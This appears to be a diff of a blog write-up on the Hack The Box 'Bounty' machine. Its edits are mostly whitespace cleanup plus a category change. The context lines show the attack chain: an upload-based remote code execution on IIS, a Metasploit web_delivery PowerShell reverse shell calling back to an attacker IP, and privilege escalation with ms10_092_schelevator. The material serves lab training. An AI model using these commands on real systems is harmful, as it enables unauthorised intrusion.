@@ -7,7 +7,7 @@ author: BoiteAKlou
 categories:
 - "Writeup"
 - "Tutorial"
-- "Web"
+- "Pentest"
 ---
 
 
@@ -50,7 +50,7 @@ Host is up (0.039s latency).
 Not shown: 999 filtered ports
 PORT   STATE SERVICE VERSION
 80/tcp open  http    Microsoft IIS httpd 7.5
-| http-methods: 
+| http-methods:
 |_  Potentially risky methods: TRACE
 |_http-server-header: Microsoft-IIS/7.5
 |_http-title: Bounty
@@ -84,7 +84,7 @@ A wonderful merlin drawing! It might be an hint.
 The source code doesn't reveal anything more... Hopefully gobuster will fly to our rescue!
 
 ```bash
-boiteaklou@kali:~/Bounty$ cat gobuster/bounty 
+boiteaklou@kali:~/Bounty$ cat gobuster/bounty
 /UploadedFiles (Status: 301)
 /uploadedFiles (Status: 301)
 /uploadedfiles (Status: 301)
@@ -159,7 +159,7 @@ Our file uploaded successfully so it means this file extension is allowed. We wi
 
 ![RCE vulnerability test]({{ "/assets/2018-10-28/vulnerable.png" | absolute_url }} "RCE vulnerability test")
 
-It works! :fireworks: Now we should be able to execute commands on the web server. 
+It works! :fireworks: Now we should be able to execute commands on the web server.
 
 ### Meterpreter Shell
 
@@ -181,7 +181,7 @@ Here is the list of steps we will follow:
 First, we have to run Metasploit console with `msfconsole`. Then, we will use the **web delivery script** exploit module. A module is loaded with the keyword *"use"*, followed by the path of the module.
 
 ```bash
-msf > use exploit/multi/script/web_delivery 
+msf > use exploit/multi/script/web_delivery
 msf exploit(multi/script/web_delivery) >
 ```
 
@@ -222,16 +222,16 @@ We will now specify several parameters in order to adapt the payload to our envi
 ```bash
 msf exploit(multi/script/web_delivery) > set SRVHOST 10.10.13.75  # Ip address of our machine
 SRVHOST => 10.10.13.75
-msf exploit(multi/script/web_delivery) > set TARGET 2  # TARGET 2 = powershell payload 
+msf exploit(multi/script/web_delivery) > set TARGET 2  # TARGET 2 = powershell payload
 TARGET => 2
 msf exploit(multi/script/web_delivery) > set PAYLOAD windows/x64/meterpreter/reverse_tcp  # The payload we want to inject, a reverse shell
 PAYLOAD => windows/x64/meterpreter/reverse_tcp
 msf exploit(multi/script/web_delivery) > set LHOST 10.10.13.75  # IP address for the reverse shell
 LHOST => 10.10.13.75
-msf exploit(multi/script/web_delivery) > exploit 
+msf exploit(multi/script/web_delivery) > exploit
 [*] Exploit running as background job 0.
-msf exploit(multi/script/web_delivery) > 
-[*] Started reverse TCP handler on 10.10.13.75:4444 
+msf exploit(multi/script/web_delivery) >
+[*] Started reverse TCP handler on 10.10.13.75:4444
 [*] Using URL: http://10.10.13.75:8080/moceswFJvKmkeD8
 [*] Server started.
 [*] Run the following command on the target machine:
@@ -314,7 +314,7 @@ Inside **msfconsole**, we can move into the session number 1 with `sessions -i 1
 msf exploit(multi/script/web_delivery) > sessions -i 1
 [*] Starting interaction with 1...
 
-meterpreter > 
+meterpreter >
 ```
 
 From here, we can use a few shell commands (the full list can be displayed by typing `help` or `?`) or type `shell` and dive into the classical Windows command prompt.
@@ -333,7 +333,7 @@ Privilege Escalation
 
 The privilege escalation was very straight-forward for this box, especially with meterpreter.
 
-We will use a great module for lazy people, which is called: **local_exploit_suggester**. 
+We will use a great module for lazy people, which is called: **local_exploit_suggester**.
 
 ### Local Exploit Suggester
 
@@ -399,7 +399,7 @@ Then, we can launch the exploit:
 ```bash
 msf exploit(windows/local/ms10_092_schelevator) > exploit
 
-[*] Started reverse TCP handler on 10.10.13.75:4445 
+[*] Started reverse TCP handler on 10.10.13.75:4445
 [*] Preparing payload at C:\Windows\TEMP\FIydYyMVXS.exe
 [*] Creating task: sMVszFGn5xTj
 [*] SUCCESS: The scheduled task "sMVszFGn5xTj" has successfully been created.
@@ -409,7 +409,7 @@ msf exploit(windows/local/ms10_092_schelevator) > exploit
 [*] Final CRC32: 0xa1c992cd
 [*] Writing our modified content back...
 [*] Validating task: sMVszFGn5xTj
-[*] 
+[*]
 [*] Folder: \
 [*] TaskName                                 Next Run Time          Status         
 [*] ======================================== ====================== ===============
@@ -430,7 +430,7 @@ msf exploit(windows/local/ms10_092_schelevator) > exploit
 [*] SUCCESS: The scheduled task "sMVszFGn5xTj" was successfully deleted.
 [*] SCHELEVATOR
 
-meterpreter > 
+meterpreter >
 ```
 
 The `getuid` command will confirm that the exploit worked:
@@ -449,7 +449,7 @@ c837f7b[...]f9d4f5ea
 
 ![Congratulations](https://media3.giphy.com/media/g9582DNuQppxC/giphy.gif?cid=3640f6095bd60b65474c4d7255c34b91)
 
-Et voilà! 
+Et voilà!
 
 Final Words
 -----------
